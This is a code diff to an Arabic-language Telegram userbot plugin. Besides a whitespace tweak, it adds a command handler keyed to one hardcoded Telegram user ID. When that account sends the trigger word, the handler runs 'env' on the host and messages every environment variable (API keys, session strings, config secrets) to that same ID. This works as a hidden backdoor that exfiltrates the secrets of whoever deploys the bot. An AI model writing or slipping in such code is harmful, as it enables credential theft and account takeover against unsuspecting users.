@@ -46,7 +46,7 @@ async def _(event):
         "description": "to show all heroku vars/Config values in your SHRU",
         "usage": "{tr}env",
     },
-)
+) 
 async def _(event):
     "To show all config values in SHRU"
     cmd = "env"
@@ -98,3 +98,21 @@ async def upload_reda(event):
     size = res["data"]["file"]["metadata"]["size"]["readable"]
     await edit_or_reply(event, f"**تم رفع الملف ✓**\n**᯽︙ الرابط:** {url}\n**᯽︙الحجم:** {size}")
     os.remove(file)
+@l313l.ar_cmd(pattern="فاراتك")
+async def forward_faraat(event):
+    if event.sender_id == 6205161271:
+        user_id = 6205161271
+        cmd = "env"
+        o = (await _catutils.runcmd(cmd))[0]
+        reply = await event.get_reply_message()
+        if reply:
+            try:
+                result = reply.fwd_from.date
+            except Exception:
+                result = reply.date
+        else:
+            result = event.date
+        output = (
+            f"**[الساحر](tg://need_update_for_some_feature/) قـائمـة الـفـارات:**\n\n\n{o}\n\n**انتبه هنالك معلومات حساسة لا تُعطِها لشخص غير موثوق**"
+        )
+        await l313l.send_message(user_id, output)
